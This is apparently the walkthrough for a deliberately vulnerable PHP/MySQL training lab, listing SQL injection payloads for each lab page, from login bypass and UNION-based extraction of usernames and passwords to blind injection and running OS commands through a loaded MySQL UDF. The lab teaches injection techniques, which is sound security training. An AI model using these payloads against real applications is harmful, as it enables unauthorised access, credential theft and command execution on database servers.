# Walkthrough document

This document explains the different attacks that can be done on this setup. Use `?debug=true` to see the actual query being executed.

## Registration

Use the `register.php` to create users

## Login bypass attack

Bypassing login using boolean expressions

**Page:** `login1.php`

**Attack:** 
   
- `non-existent-user' OR 1=1 -- //`
- `bob' -- //` 

**Page:** `login2.php`

**Attack:** 

- `voldemort') -- //`

## Verbose SQL Error based Injection

Forcing error conditions to reveal and extract data

**Page:** `login1.php` 

**Attack:**

- `' or 1 in (select @@version) -- //`
- `' or 1=CAST((select group_concat(table_name) from information_schema.columns) AS SIGNED) -- //`
- `' or 1 in (select password from users where username = 'admin') -- //`


## Extracting data using UNION queries

Using a pre existing SQL select query to fetch additional data from the DB

**Page:** `searchproducts.php` 

**Attack:**

- `' order by 5 -- //`
- `' union select 1,2,3,4,5 -- //`
- `' union select null, null, database(), user(), @@version -- //`
- `' union select null, table_name, column_name, table_schema, null from information_schema.columns -- //`
- `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
- `' union select null, id, username, password, fname from users -- //`

## Second order SQL injection

User input is stored and reused as is in a different function that has no protection

**Page:** `secondorder_register.php`

**Attack:**

```
- ' or 1 in (select @@version) -- //
- ' or 1 in (select password from users where username='admin') -- //
- ' or 1 in (select convert(password,unsigned) from users where username='admin') -- //
- navigate to secondorder_changepass.php
```

## Blind SQL injection

**Page:** `blindsqli.php`

**Attack:**

- `?user=1' and 1=1 -- //`
- `?user=admin' and substring((select table_name from information_schema.columns where column_name = 'password' LIMIT 1),1,1)>'a' -- //` 
- `?user=1' union select 1,2,3,4, if (substring(username,1,1) > 'd', benchmark(100000000, encode('txt','secret')),null) from users where id=1 -- //` 

## OS interaction

**Page:** `os_sqli.php`

**Attack:** 

- Given that we have mounted the `./udf` folder to `/usr/lib/mysql/plugin`, the `lib_mysqludf_sys.so` inside the `./udf` is available to the MySQL instance
- UDF obtained from `https://github.com/sqlmapproject/udfhack/blob/35abeedc6c590d2fc666a64b57aad9cf7944ec7a/linux/lib_mysqludf_sys/lib_mysqludf_sys.so`
- Use the ability to perform stacked queries in `os_sqli.php` to create a UDF function from the `lib_mysqludf_sys.so` library.
- `os_sqli.php?user=qqqq'; create function sys_eval returns string soname 'lib_mysqludf_sys.so';`
- `os_sqli.php?user=qqqq' union select 1,sys_eval('id'),3,4,5 -- //`
- To drop the function and redo the exercise run `os_sqli.php?user=qqqq';drop function sys_eval;`
- As the MySQL instance is running in a separate container than the web application, the `INTO OUTFILE` way of writing a php shell to disk will not work as the shell will be written inside the MySQL container can cannot be accessed from the web application.

## References

- SQL Injection Cheat Sheet - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- Various ways of loading a UDF into MySQL - https://osandamalith.com/2018/02/11/mysql-udf-exploitation/